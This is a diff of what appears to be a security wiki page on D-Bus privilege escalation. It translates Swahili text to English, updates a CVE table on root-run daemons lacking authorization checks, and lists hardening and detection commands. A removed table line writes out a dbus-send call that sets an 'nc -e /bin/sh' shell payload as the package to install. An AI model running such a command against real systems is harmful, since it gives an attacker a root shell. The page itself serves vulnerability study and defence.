-| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Njia ya umma `Dispatch` haina ACL zozote → mshambuliaji anaweza kuamuru mfanyakazi wa *package-manager* kusakinisha RPM zisizo na mipaka. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
+| Year | CVE | Component | Root Cause | Offensive lesson |
+|------|-----|-----------|------------|------------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service inayoendeshwa na root ilifichua D-Bus interface ambayo users wasio na privileges wangeweza kuireconfigure, ikiwemo kupakia attacker-controlled macro behavior. | Ikiwa daemon inafichua **device/profile/config management** kwenye system bus, chukulia writable configuration na macro features kama code-execution primitives, si tu "settings". |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Root-running compatibility proxy ilipeleka requests kwa backend services bila kuhifadhi original caller's security context, hivyo backends zikamwamini proxy kama UID 0. | Chukulia **proxy / bridge / compatibility** D-Bus services kama bug class tofauti: ikiwa zinarelay privileged calls, hakikisha caller UID/Polkit context inafika vipi backend. |
 
-Mifumo ya kuzingatia:
-1. Huduma inafanya kazi **kama root kwenye sistema bus**.
-2. Hakuna ukaguzi wa PolicyKit (au umeepukwa na proxy).
-3. Njia hatimaye inapelekea `system()`/sakinisho la kifaa/mabadiliko ya usanidi → utekelezaji wa msimbo.
+Patterns to notice:
+1. Service runs **as root on the system bus**.
+2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
+3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.
 
-Tumia `dbusmap --enable-probes` au `busctl call` ya mikono kuthibitisha ikiwa patch inarudisha nyuma mantiki sahihi ya `polkit_authority_check_authorization()`.
+Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.
 
 ---
 
-## Ushindi wa Haraka wa Kuimarisha & Kugundua
+## Hardening & Detection Quick-Wins
 
-* Tafuta sera zinazoweza kuandikwa na *send/receive*-zimefunguliwa:
+* Search for world-writable or *send/receive*-open policies:
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* Hitaji Polkit kwa njia hatari – hata *root* proxies zinapaswa kupitisha PID ya *mpiga simu* kwa `polkit_authority_check_authorization_sync()` badala ya zao wenyewe.
-* Punguza haki katika msaada wa muda mrefu (tumia `sd_pid_get_owner_uid()` kubadilisha majimbo baada ya kuungana na bus).
-* Ikiwa huwezi kuondoa huduma, angalau *punguza* kwa kundi maalum la Unix na punguza ufikiaji katika sera yake ya XML.
-* Blue-team: wezesha kukamata kudumu kwa sistema bus kwa `busctl capture --output=/var/log/dbus_$(date +%F).pcap` na uagizeni kwenye Wireshark kwa ajili ya kugundua anomali.
+* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
+* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
+* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
+* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.
 
 ---
 
-## Marejeleo
+## References
 
 - [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
 - [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
-
-
-- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
-
 {{#include ../../banners/hacktricks-training.md}}
